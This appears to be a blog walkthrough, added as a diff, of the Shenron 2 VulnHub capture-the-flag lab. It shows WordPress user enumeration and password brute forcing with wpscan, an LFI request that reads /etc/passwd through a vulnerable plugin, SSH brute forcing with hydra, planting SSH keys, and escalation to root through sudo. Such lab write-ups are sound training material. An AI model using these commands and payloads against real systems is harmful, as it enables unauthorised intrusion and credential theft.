@@ -1,0 +1,133 @@
+---
+title: "Shenron 2 Vulnhub CTF Walkthrough"
+description: "Shenron 2 Vulnhub CTF Walkthrough"
+---
+
+
+nmap
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctfs/shenron-2]
+└─$ sudo nmap -p- -sV 192.168.56.158    
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-07 16:50 EDT
+Nmap scan report for 192.168.56.158
+Host is up (0.00073s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+{% endhighlight %}
+
+After checking both port 80 an 8080 in the browser. 8080 shows a wordpress instance. 
+
+
+wpscan user enumeration:
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctfs/shenron-2]
+└─$ wpscan --url http://shenron:8080/ -e u 
+
+[i] User(s) Identified:
+
+[+] admin
+{% endhighlight %}
+
+
+wpscan brute forcing login: 
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctfs/shenron-2]
+└─$ wpscan --url http://shenron:8080/ -U admin -P /usr/share/wordlists/rockyou.txt 
+
+[!] Valid Combinations Found:
+ | Username: admin, Password: admin
+{% endhighlight %}
+
+Lesson learned here: Try default creds before firing up a bruteforcing tool...
+Browsing the WordPress installation showed me no means of uploading a reverse shell 
+to the installation. 
+
+enumerating the plugins reveals Site Editor version 1.1.1, which is vulnerable to LFI
+PoC: https://www.exploit-db.com/exploits/44340
+
+from the PoC we can navigate to the following URL that reads the etc/passwd file:
+http://shenron:8080//wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd 
+
+This gives us the following users: 
+
+root
+shenron
+jenny
+
+Let's use the user list with hydra and try to brute force ssh. 
+{% highlight terminal %}
+┌──(kali㉿kali)-[~/ctfs/shenron-2]
+└─$ hydra -L users.txt -P users.txt ssh://shenron
+[22][ssh] host: shenron   login: jenny   password: jenny
+{% endhighlight %}
+
+Logging in over SSH:
+{% highlight terminal %}
+jenny@shenron-2:~$ 
+{% endhighlight %}
+
+Setting up SSH keys for the user shenron:
+
+{% highlight terminal %}
+bash-5.0$ mkdir .ssh
+bash-5.0$ cd .ssh/
+bash-5.0$ ls
+bash-5.0$ vim authorized_keys
+vim        vim.basic  vimdiff    vim.tiny   vimtutor   
+bash-5.0$ vim authorized_keys
+bash-5.0$ chmod 600 authorized_keys 
+bash-5.0$ ssh
+ssh               ssh-argv0         ssh-import-id     ssh-keygen
+ssh-add           ssh-copy-id       ssh-import-id-gh  ssh-keyscan
+ssh-agent         sshd              ssh-import-id-lp  
+bash-5.0$ ls -a
+.  ..  authorized_keys
+bash-5.0$ cd ../
+bash-5.0$ ls
+Desktop  Documents  Downloads  Music  Pictures	Public	Templates  Videos  wordpress
+bash-5.0$ chmod go-rwx .ssh/
+bash-5.0$ ls -asl .ssh/
+total 12
+4 drwx------  2 shenron jenny   4096 Apr  8 05:43 .
+4 drwxr-xr-x 17 shenron shenron 4096 Apr  8 05:42 ..
+4 -rw-------  1 shenron jenny    563 Apr  8 05:43 authorized_keys
+bash-5.0$
+{% endhighlight %}
+
+Logging in over ssh and getting root: 
+
+{% highlight terminal %}
+shenron@shenron-2:~/Desktop$ ls -a
+.  ..  local.txt  .pass
+shenron@shenron-2:~/Desktop$ cat .pass 
+KNUEK3SSN5HFG2CFNZJG6TSTNBCW4UTPJZJWQRLOKJXU4U3IIVXFE32OIBJWQRLOKJXU4I2TNBCW4UTPJZIGCU3TK5XVEZAK
+shenron@shenron-2:~/Desktop$ echo "KNUEK3SSN5HFG2CFNZJG6TSTNBCW4UTPJZJWQRLOKJXU4U3IIVXFE32OIBJWQRLOKJXU4I2TNBCW4UTPJZIGCU3TK5XVEZAK" | base
+base32    base64    basename  
+shenron@shenron-2:~/Desktop$ echo "KNUEK3SSN5HFG2CFNZJG6TSTNBCW4UTPJZJWQRLOKJXU4U3IIVXFE32OIBJWQRLOKJXU4I2TNBCW4UTPJZIGCU3TK5XVEZAK" | base32 -d
+ShEnRoNShEnRoNShEnRoNShEnRoNShEnRoN@ShEnRoN#ShEnRoNPaSsWoRd
+shenron@shenron-2:~/Desktop$ sudo -l
+[sudo] password for shenron: 
+Matching Defaults entries for shenron on shenron-2:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shenron may run the following commands on shenron-2:
+    (ALL : ALL) ALL
+shenron@shenron-2:~/Desktop$ sudo -i
+root@shenron-2:~#
+
+root@shenron-2:~# cat root.txt 
+                                                               
+  mmmm  #                                                 mmmm 
+ #"   " # mm    mmm   m mm    m mm   mmm   m mm          "   "#
+ "#mmm  #"  #  #"  #  #"  #   #"  " #" "#  #"  #             m"
+     "# #   #  #""""  #   #   #     #   #  #   #   """     m"  
+ "mmm#" #   #  "#mm"  #   #   #     "#m#"  #   #         m#mmmm
+                                                               
+Your Root Flag Is Here :- a89604e285437f789ff278d2239aea02
+
+root@shenron-2:~# 
+{% endhighlight %}
